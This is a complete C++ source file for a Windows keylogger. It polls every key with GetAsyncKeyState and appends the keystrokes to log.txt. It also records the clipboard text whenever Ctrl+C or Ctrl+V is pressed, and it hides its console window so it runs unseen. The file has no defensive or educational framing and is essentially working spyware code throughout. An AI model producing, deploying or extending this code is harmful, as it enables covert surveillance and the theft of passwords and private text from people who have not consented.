#include <iostream>
#include <Windows.h>
#include <fstream>
using namespace std;

// Forward declaration of the logClipboard function
void logClipboard(const char *file);

// Function to log key strokes and clipboard actions
void logKey(int key, const char *file) {
    ofstream logfile;
    logfile.open(file, ios::app);

    if (key == VK_BACK) {
        logfile << "[BACKSPACE]";
    } else if (key == VK_RETURN) {
        logfile << "\n";
    } else if (key == VK_SPACE) {
        logfile << " ";
    } else if (key == VK_SHIFT) {
        logfile << "[SHIFT]";
    } else if (key == VK_TAB) {
        logfile << "[TAB]";
    } else if (key == VK_ESCAPE) {
        logfile << "[ESC]";
    } else if (key == VK_CONTROL) {
        logfile << "[CTRL]";
    } else if (key == 'C' && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
        logfile << "[CTRL+C] - ";
        logClipboard(file);  // Log clipboard when copying
    } else if (key == 'V' && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
        logfile << "[CTRL+V] - ";
        logClipboard(file);  // Log clipboard when pasting
    } else {
        logfile << char(key);
    }

    logfile.close();
}
// Function to log clipboard content
void logClipboard(const char *file) {
    if (!OpenClipboard(nullptr)) return;  // Open clipboard to read contents

    ofstream logfile;
    logfile.open(file, ios::app);

    // Check if the clipboard contains text
    if (IsClipboardFormatAvailable(CF_TEXT)) {
        HANDLE hClipboardData = GetClipboardData(CF_TEXT);  // Get clipboard text
        char *pchData = (char*)GlobalLock(hClipboardData);  // Lock and get pointer to the clipboard data

        if (pchData != nullptr) {
            logfile << "Clipboard: " << pchData << "\n";  // Log clipboard content
            GlobalUnlock(hClipboardData);  // Unlock the memory
        }
    }

    logfile.close();
    CloseClipboard();  // Close clipboard
}
// Main loop to capture keystrokes and clipboard actions
int main() {
    const char *file = "log.txt";  // File to store log

    // Hide the console window (optional)
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    while (true) {
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                logKey(key, file);
            }
        }
        Sleep(10);  // Small delay to reduce CPU usage
    }

    return 0;
}
